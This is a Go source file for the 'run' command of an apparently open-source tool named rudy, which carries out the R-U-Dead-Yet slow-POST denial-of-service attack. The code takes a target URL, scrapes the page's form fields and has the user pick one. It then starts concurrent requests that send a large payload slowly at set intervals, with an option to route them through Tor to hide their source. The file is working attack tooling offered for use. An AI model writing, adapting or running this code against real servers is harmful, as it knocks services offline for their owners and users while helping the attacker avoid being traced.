package commands

import (
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/darkweak/rudy/logger"
	"github.com/darkweak/rudy/request"
	"github.com/dustin/go-humanize"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

var (
	concurrents int64
	filepath    string
	interval    time.Duration
	size        string
	tor         string
	url         string
)

type Run struct{}

// SetFlags set the available flags.
func (*Run) SetFlags(flags *pflag.FlagSet) {
	flags.Int64VarP(&concurrents, "concurrents", "c", 1, "Concurrent requests count.")
	flags.StringVarP(&filepath, "filepath", "f", "", "Filepath to the payload.")
	flags.DurationVarP(&interval, "interval", "i", 10*time.Second, "Interval between packets.")
	// Default ~1MB
	flags.StringVarP(&size, "payload-size", "p", "1MB", "Random generated payload with the given size.")
	flags.StringVarP(&tor, "tor", "t", "", "TOR endpoint (either socks5://1.1.1.1:1234, or 1.1.1.1:1234).")
	flags.StringVarP(&url, "url", "u", "", "Target URL to send the attack to.")
}

// GetRequiredFlags returns the server required flags.
func (*Run) GetRequiredFlags() []string {
	return []string{"url"}
}

// GetArgs return the args.
func (*Run) GetArgs() cobra.PositionalArgs {
	return nil
}

// GetDescription returns the command description.
func (*Run) GetDescription() string {
	return "Run the rudy attack"
}

// GetLongDescription returns the command long description.
func (*Run) GetLongDescription() string {
	return "Run the rudy attack on the target"
}

// Info returns the command name.
func (*Run) Info() string {
	return "run -u http://domain.com"
}

// Run executes the script associated to the command.
func (*Run) Run() RunCmd {
	return func(_ *cobra.Command, _ []string) {
		var waitgroup sync.WaitGroup
		var data []byte
		var e error
		var isize uint64
		exit := false

		if  filepath != "" {
			if data, e = os.ReadFile(filepath); e != nil {
				panic(fmt.Sprintf("Error %s while getting file \"%s\"", e.Error(), filepath))
			}
			isize = uint64(len(data))
		} else { 
			isize, e = humanize.ParseBytes(size)
		}
		if e != nil {
			panic(e)
		}

		fields, err := request.GetFormFields(url)

		if err != nil {
			err = fmt.Errorf("An error occurred during the request: %w", err)
			logger.Logger.Sugar().Error(err)
			panic(err)
		}

		if len(fields) < 1 {
			err = fmt.Errorf("No input fields found at %s", url)
			logger.Logger.Sugar().Error(err)
			return
		} else {
			for {

				if exit { break }

				fmt.Printf("Choice one of the following input fields:\n")

				for i, opt := range fields {
					fmt.Printf("%d. %s\n", i, opt) 
				}

				fmt.Printf("Number:\n>")
				var selection int
				_, err := fmt.Scan(&selection)
				
				time.Sleep(2 * time.Second)
				
				select  {
					case <-request.Context.Done():
						return
					default:
						if err != nil || selection < 1 || selection > len(fields) {
							fmt.Printf("Invalid selection. Try again.\n")
							continue
						} else {
							request.TargetFieldName = fields[selection] + "="
							exit = true
						}
				}
			}
		}

		waitgroup.Add(int(concurrents))

		for i := 0; i < int(concurrents); i++ {
			go func() {
				req := request.NewRequest(int64(isize), url, interval, data)
				if tor != "" {
					req.WithTor(tor)
				}

				if req.Send() == nil {
					logger.Logger.Sugar().Infof("Request successfully sent to %s", url)
				}

				waitgroup.Done()
			}()
		}

		waitgroup.Wait()
	}
}

func newRun() command {
	return &Run{}
}

var (
	_ command             = (*Run)(nil)
	_ commandInstanciator = newRun
)
